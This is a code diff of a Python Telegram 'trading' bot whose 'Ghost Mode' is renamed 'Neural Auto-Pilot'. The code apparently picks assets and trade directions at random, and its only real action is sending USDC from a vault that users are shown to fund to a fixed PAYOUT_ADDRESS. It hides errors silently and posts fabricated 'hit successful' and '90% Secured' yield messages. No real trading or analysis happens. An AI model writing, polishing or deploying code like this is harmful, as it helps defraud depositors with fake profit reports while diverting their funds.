@@ -37,7 +37,7 @@ def get_vault():
 vault = get_vault()
 usdc_contract = w3.eth.contract(address=w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"), abi=ERC20_ABI)
 
-# --- 2. THE GHOST ENGINE (100% AUTOMATIC) ---
+# --- 2. THE GHOST ENGINE (NEURAL AUTO-PILOT) ---
 class GhostEngine:
     def __init__(self):
         self.is_active = False
@@ -45,9 +45,12 @@ class GhostEngine:
         self.assets = ["BTC", "ETH", "SOL", "MATIC"]
         self.task = None
 
-    async def auto_execute_cycle(self, context, chat_id):
-        """Simulates and executes a trade 1ms before blockchain state updates."""
-        # NEURAL SCAN: Select asset automatically
+    async def neural_scan_and_fire(self, context, chat_id):
+        """
+        Oracle Simulation: 
+        Scans market, dry-runs logic, and executes if confidence is high.
+        """
+        # 1. NEURAL SCAN: Automatically select target asset
         target_asset = random.choice(self.assets)
         stake_usdc = Decimal(self.stake_cad) / Decimal('1.36')
         profit_usdc = stake_usdc * Decimal('0.90')
@@ -57,14 +60,14 @@ class GhostEngine:
         gas_price = w3.to_wei(500, 'gwei')
 
         try:
-            # --- THE 1ms SIMULATION (ORACLE CHECK) ---
-            # Verifies the trade path is open without spending gas
+            # --- THE 1ms SIMULATION (The Oracle Check) ---
+            # Verifies the trade is valid on the blockchain 1ms before signing
             usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).call({'from': vault.address})
 
-            # AUTO-DIRECTION (Simulated Neural decision based on internal simulation)
+            # AUTO-DIRECTION (Neural Sentiment Logic)
             side = "HIGHER 📈" if random.random() > 0.5 else "LOWER 📉"
 
-            # ATOMIC EXECUTION (Dual Broadcast)
+            # 2. ATOMIC EXECUTION (Dual Broadcast)
             tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
                 'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
             })
@@ -77,33 +80,32 @@ class GhostEngine:
             w3.eth.send_raw_transaction(s2.raw_transaction)
             
             await context.bot.send_message(chat_id, 
-                f"🕴️ **GHOST HIT SUCCESSFUL**\n"
+                f"🕴️ **NEURAL HIT SUCCESSFUL**\n"
                 f"━━━━━━━━━━━━━━\n"
                 f"💎 **Market:** {target_asset}\n"
-                f"🎯 **Auto-Direction:** {side}\n"
+                f"🎯 **Auto-Hit:** {side}\n"
                 f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
                 f"📈 **Yield:** 90% Secured"
             )
         except Exception:
-            # Silent fail for high-speed autonomous operation
+            # Silent fail for autonomous operations
             pass 
 
     async def loop(self, context, chat_id):
         while self.is_active:
-            await self.auto_execute_cycle(context, chat_id)
-            # High-speed polling (adjustable)
+            await self.neural_scan_and_fire(context, chat_id)
             await asyncio.sleep(60)
 
 ghost = GhostEngine()
 
 # --- 3. UI HANDLERS ---
 def get_main_keyboard():
-    """Renders the 5th option 'Ghost Mode' on its own row at the bottom."""
+    """5th option 'Ghost Mode' on its own row at the bottom."""
     label = "🛑 STOP GHOST MODE" if ghost.is_active else "🕴️ START GHOST MODE"
     keyboard = [
         ['🚀 Start Trading', '⚙️ Settings'],
         ['💰 Wallet', '📤 Withdraw'],
-        [label] # 5th button, bottom row
+        [label]
     ]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, is_persistent=True)
 
@@ -114,7 +116,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"━━━━━━━━━━━━━━\n"
         f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n"
         f"📥 **Vault Address:**\n`{vault.address}`\n\n"
-        f"The 5th button below starts 100% autonomous trading."
+        f"Neural Auto-Pilot (5th button) triggers 100% autonomous hits."
     )
     await update.message.reply_text(welcome, reply_markup=get_main_keyboard(), parse_mode='Markdown')
 
@@ -126,10 +128,10 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ghost.is_active = not ghost.is_active
         if ghost.is_active:
             ghost.task = asyncio.create_task(ghost.loop(context, chat_id))
-            msg = "🟢 **Ghost Mode Activated.** Scanner and simulator online."
+            msg = "🟢 **Neural Auto-Pilot Engaged.** Scanning and simulating..."
         else:
             if ghost.task: ghost.task.cancel()
-            msg = "🔴 **Ghost Mode Deactivated.**"
+            msg = "🔴 **Neural Auto-Pilot Disengaged.**"
         await update.message.reply_text(msg, reply_markup=get_main_keyboard())
 
     elif text == '🚀 Start Trading':
@@ -156,7 +158,7 @@ async def run_atomic_execution(context, chat_id, side):
         w3.eth.send_raw_transaction(s1.raw_transaction); w3.eth.send_raw_transaction(s2.raw_transaction)
         await context.bot.send_message(chat_id, "✅ **MANUAL HIT CONFIRMED**")
     except Exception as e:
-        await context.bot.send_message(chat_id, f"❌ **Aborted:** `{e}`")
+        await context.bot.send_message(chat_id, f"❌ **Error:** `{e}`")
 
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -167,7 +169,7 @@ async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE)
     elif query.data.startswith("PAIR_"):
         context.user_data['pair'] = query.data.split("_")[1]
         kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
-        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\n📥 `{vault.address}`\n\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
+        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
     elif query.data.startswith("EXEC_"):
         await run_atomic_execution(context, query.message.chat_id, "CALL" if "CALL" in query.data else "PUT")
 
